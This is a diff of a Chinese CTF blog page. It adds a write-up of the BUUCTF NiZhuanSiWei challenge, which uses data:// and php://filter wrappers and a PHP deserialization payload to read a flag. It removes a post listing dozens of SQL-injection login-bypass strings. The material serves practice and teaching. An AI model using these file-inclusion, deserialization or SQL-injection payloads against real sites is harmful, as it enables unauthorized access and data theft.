@@ -277,6 +277,130 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-nizhuansiwei" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/02/05/nizhuansiwei/" class="article-date">
+      <time datetime="2021-02-05T05:26:32.000Z" itemprop="datePublished">2021-02-05</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/02/05/nizhuansiwei/">19-buu练习[ZJCTF 2019]NiZhuanSiWei</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>打开靶场，给出一段代码：<br><img src="/2021/02/05/nizhuansiwei/a1.png"><br><b style="color:pink">代码注释如下：</b><br>    &lt;?php<br>    $text = $_GET[“text”];<br>    $file = $_GET[“file”];<br>    $password = $_GET[“password”];<br>    if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”)){<br>    //判断$text变量是否存在并判断”welcome to the zjctf”是否被写入</p>
+<pre><code>echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+//如果满足条件输出写入的内容
+
+if(preg_match(&quot;/flag/&quot;,$file))&#123;  //不给你看flag
+    echo &quot;Not now!&quot;;
+    exit(); 
+&#125;else&#123;
+    include($file);  //useless.php (题目源码注释)
+
+//文件包含，已经提示要我们查看userless.php 
+    $password = unserialize($password);    //反序列化$password
+    echo $password;
+&#125;
+&#125;
+else&#123;
+highlight_file(__FILE__);
+&#125;
+?&gt;</code></pre>
+<p><b style="color:pink">知识点：</b><br>1.data伪协议写入文件<br>data:// 协议</p>
+<p style="color:yellow">条件：</p>
+
+<p>allow_url_fopen:on<br>allow_url_include :on</p>
+<p style="color:yellow">作用：</p>
+
+<p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<p style="color:yellow">用法：</p>
+
+<p>data://text/plain,<br>data://text/plain;base64,</p>
+<p style="color:yellow">示例：</p>
+
+<p>1##data://text/plain,<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=data://text/plain">http://127.0.0.1/include.php?file=data://text/plain</a>,<?php%20phpinfo();?><br><img src="/2021/02/05/nizhuansiwei/a5.png"><br>2##data://text/plain;base64,<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</a><br><img src="/2021/02/05/nizhuansiwei/a6.png"><br>2.php://（具体内容前面有所涉及）</p>
+<ul>
+<li>php://filter用于读取源码
+</li><li>php://input用于执行php代码
+</li></ul>
+
+<p>3.php反序列化漏洞，详细内容参见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/10484832.html">https://www.cnblogs.com/ichunqiu/p/10484832.html</a><br><b style="color:pink">解题步骤：</b><br><b style="color:blue">##第一个绕过：</b></p>
+<ul>
+<li>if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
+</li></ul>
+
+<p>这一行代码进行一个绕过。因为我们不知道后台哪个文件的源码是welcome to the zjctf，说不准就真没有，只能在传入的时候直接带进来。这里利用到data伪协议将数据直接写进去，以供file_get_contents函数读取。</p>
+<ul>
+<li>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+</li></ul>
+
+<p><b style="color:blue">##第二个绕过：</b><br>if(preg_match(“/flag/“,$file)){     #上传的file变量中不能包含’flag’字样<br>        echo “Not now!”;<br>        exit();<br>    }else{<br>        include($file);  //useless.php<br>        $password = unserialize($password);<br>        echo $password;<br>    }<br>这里源码给你提示了，让你包含useless.php，如果包含flag.php直接报错。<br>于是</p>
+<ul>
+<li>file=useless.php
+</li></ul>
+
+<p>如果直接这么执行的话，返回的文件中包含的php代码会直接当成php命令来执行，所以需要base64编码一下，以免被执行。</p>
+<ul>
+<li>file=php://filter/read=convert.base64-encode/resource=useless.php
+</li></ul>
+
+<p>这里利用php”//filter来读取源码:<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br><img src="/2021/02/05/nizhuansiwei/a2.png"><br>base64解码：<br><img src="/2021/02/05/nizhuansiwei/a3.png"><br><b style="color:blue">##第三个绕过：</b><br>$password = $_GET[“password”];<br>include($file);  //useless.php<br>$password = unserialize($password);<br>echo $password;</p>
+<p style="color:yellow">这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p>
+
+<p>  &lt;？php<br> class Flag{  //flag.php<br>    public $file=”flag.php”;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “《br》”;<br>        return (“U R SO CLOSE !///COME ON PLZ”);<br>        }<br>    }<br>}<br>$a = new Flag();<br>echo serialize($a);<br>?&gt;<br>//O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p style="color:yellow">最后payload：</p>
+<ul>
+<li>http://6619a3b1-daa6-4ab9-bb3d-ba8b90593516.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D
+</li></ul>
+
+<p>查看源代码，flag在源代码中：<br><img src="/2021/02/05/nizhuansiwei/a4.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-buy" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1107,204 +1231,6 @@
 <p>得到flag！<br>被sql支配的一天</p>
 <p><img src="/2021/01/25/love/love10.png"></p>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/01/24/sql/" class="article-date">
-      <time datetime="2021-01-24T09:51:45.000Z" itemprop="datePublished">2021-01-24</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/01/24/sql/">10-buu练习EasySQL2</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>打开题目链接，如下：<br><img src="/2021/01/24/sql/sql2.png"><br>尝试万能密码：<br>用户名–&gt;admin；<br>密码–&gt;1’or’1’=’1<br><img src="/2021/01/24/sql/sql1.png"><br>竟然真的出来了<br>真是轻松的一天！（难得啊）</p>
-<h2>接下来总结一下万能密码：</h2>
-<h3>aspx万能密码</h3>
-<table border="1">
-<tr>
-<td>asp</td>
-<td>aspx万能密码</td>
-</tr>
-<tr>
-<td>1</td>
-<td>"or “a”="a</td>
-</tr>
-<tr>
-<td>2：</td>
-<td>‘.).or.(’.a.’=’.a</td>
-</tr>
-<tr>
-<td>3：</td>
-<td>or 1=1–</td>
-</tr>
-<tr>
-<td>4：</td>
-<td>'or 1=1–</td>
-</tr>
-<tr>
-<td>5：</td>
-<td>a’or’ 1=1–</td>
-</tr>
-<tr>
-<td>6：</td>
-<td>"or 1=1–</td>
-</tr>
-<tr>
-<td>7：</td>
-<td>'or.‘a.’='a</td>
-</tr>
-<tr>
-<td>8：</td>
-<td>“or”="a’='a</td>
-</tr>
-<tr>
-<td>9：</td>
-<td>‘or’’=’</td>
-</tr>
-<tr>
-<td>10：</td>
-<td>‘or’=‘or’</td>
-</tr>
-<tr>
-<td>11：</td>
-<td>admin’or 1=1#</td>
-</tr>
-
-<table border="1">
-<h3>PHP万能密码</h3>
-<tr>
-<td>php</td><td>PHP万能密码</td>
-</tr>
-<tr>
-<td>1</td><td>'or 1=1/*</td>
-</tr>
-<tr>
-<td>2</td><td>"or “a”="a</td>
-</tr>
-<tr>
-<td>3</td><td>"or 1=1–</td>
-</tr>
-<tr>
-<td>4</td><td>“or”="</td>
-</tr>
-<tr>
-<td>5</td><td>“or”="a’='a</td>
-</tr>
-<tr>
-<td>6</td><td>"or1=1–</td>
-</tr>
-<tr>
-<td>7</td><td>“or=or”</td>
-</tr>
-<tr>
-<td>8</td><td>'‘or’=‘or’</td>
-</tr>
-<tr>
-<td>9</td><td>') or (‘a’='a</td>
-</tr>
-<tr>
-<td>10</td><td>‘.).or.(’.a.’=’.a</td>
-</tr>
-<tr>
-<td>11</td><td>'or 1=1</td>
-</tr>
-<tr>
-<td>12</td><td>'or 1=1–</td>
-</tr>
-<tr>
-<td>13</td><td>'or 1=1/*</td>
-</tr>
-<tr>
-<td>14</td><td>‘or"="a’='a</td>
-</tr>
-<tr>
-<td>15</td><td>‘or’ ‘1’=‘1’</td>
-</tr>
-<tr>
-<td>16</td><td>‘or’’=’</td>
-</tr>
-<tr>
-<td>17</td><td>‘or’’=’‘or’’=’</td>
-</tr>
-<tr>
-<td>18</td><td>‘or’=‘1’</td>
-</tr>
-<tr>
-<td>19</td><td>‘or’=‘or’</td>
-</tr>
-<tr>
-<td>20</td><td>'or.‘a.’='a</td>
-</tr>
-<tr>
-<td>21</td><td>'or1=1–</td>
-</tr>
-<tr>
-<td>22</td><td>1’or’1’='1</td>
-</tr>
-<tr>
-<td>23</td><td>a’or’ 1=1–</td>
-</tr>
-<tr>
-<td>24</td><td>a’or’1=1–</td>
-</tr>
-<tr>
-<td>25</td><td>or ‘a’=‘a’</td>
-</tr>
-<tr>
-<td>26</td><td>or 1=1–</td>
-</tr>
-<tr>
-<td>27</td><td>or1=1–</td>
-</tr>
-<tr>
-<td>admin’/*</td><td>密码*/’</td>
-</tr></table></table>
       
     </div>
     
